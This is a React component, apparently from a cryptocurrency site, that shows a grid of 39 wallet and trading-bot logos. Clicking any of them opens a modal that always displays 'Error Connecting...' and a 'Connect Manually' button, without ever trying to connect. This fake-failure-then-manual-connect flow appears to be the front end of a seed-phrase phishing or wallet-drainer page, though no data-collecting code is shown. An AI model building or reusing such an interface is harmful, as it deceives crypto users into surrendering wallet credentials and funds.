import React, { useEffect, useState } from "react"
import SVGIcon from "../../Components/SvgIconProp"
import { Button, Modal } from "antd";

// interface Prop{

// }

const MapSVG: React.FC = () => {
    const SVGfiles: string[] = ['TrustWallet.svg', 'Metamask.svg', 'Phantom.svg', '1inch.svg', 'AaVE.svg', 'Argent.svg', 'Binance.svg', 'BonkBot.svg',
     'Authereum.svg', 'BananaGun.svg', 'BitPay.svg', 'BRB wallet.svg',  'coinbase-logo.svg', 'Cosmos wallet.svg', 'Defi wallet.svg', 'Dharma.svg',
      'Digitex.svg', 'Exodus Wallet.svg', 'Formatic.svg', 'Gnosis Safe.svg', 'Huobi.svg', 'im Token.svg', 'Ledger live.svg', 'Ledger.svg', 'MaestroBot.svg',
       'MathWallet.svg', 'ONTO.svg',  'Pillar.svg', 'Portis.svg', 'ProdigyBot.svg', 'Rainbow.svg', 'SafeMoon.svg', 'Saitamask Wallet.svg', 'SolanaBot.svg', 
       'Terra station.svg', 'TokenPocket.svg', 'UniBot.svg', 'walletConnect.svg', 'WalletETH.svg'];

    const SVGNames: string[] = ['Trust wallet', 'Metamask', 'Phantom', '1inch', 'AaVE', 'Argent', 'Binance', 'BonkBot', 'Authereum', 'BananaGun', 'BitPay', 
     'BRB wallet',  'coinbase',  'Cosmos',  'Defi',  'Dharma',  'Digitex',  'Exodus',  'Formatic',  'Gnosis',  'Huobi', 'im Token', 'Ledger live', 'Ledger',
      'MaestroBot', 'MathWallet', 'ONTO', 'Pillar', 'Portis', 'ProdigyBot', 'Rainbow', 'SafeMoon', 'Saitamask', 'SolanaBot', 'Terra station', 'TokenPocket',
       'UniBot', 'walletConnect', 'WalletETH']

    const [open, setOpen] = useState(false);
    const [showDIv, setSHowDIv] = useState(false);

    const showModal = () => {
        setOpen(!open)
    }
    const handleCancel = () => {
        setOpen(false)
    }

    // useEffect(() => {
    //     const timer = setTimeout(() => {
    //         setSHowDIv(true);
    //       }, 3000);

    //       return () => {
    //         clearTimeout(timer);
    //       };
    // }, [open])
    
    return (
        <div  className="grid grid-cols-3 md:grid-cols-8 gap-x-16 md:gap-x-12 gap-y-4 md:gap-y-14 justify-center items-center py-10 pl-8 md:pl-0 " onClick={showModal}>
            {SVGfiles.map((fileName, index) => (
                <div key={index} className="cursor-pointer ">
                        <SVGIcon key={index} src={fileName} alt={`SVG ${index + 1}`} className="w-12 md:w-14 h-12 md:h-14"  />
                        <p className="text-xs pt-2 flex items-baseline text-white " >{SVGNames[index]}</p>
                </div>
            ))}

            <Modal 
            open={open}
            onCancel={handleCancel}
            title="Connect"
            footer={null}
            className=""
            >
                {/* {showDIv && ( */}
                    <div className="border-2 border-red-700 rounded-xl px-8 py-4">
                        <p className="text-red-700 font-semibold">Error Connecting...</p>
                        <button className="text-white text-[0.7rem] font-semibold bg-slate-900 rounded-lg px-2 py-1">Connect Manually</button>
                    </div>
                {/* )} */}
                
            </Modal>
            
        </div>
    )
}

export default MapSVG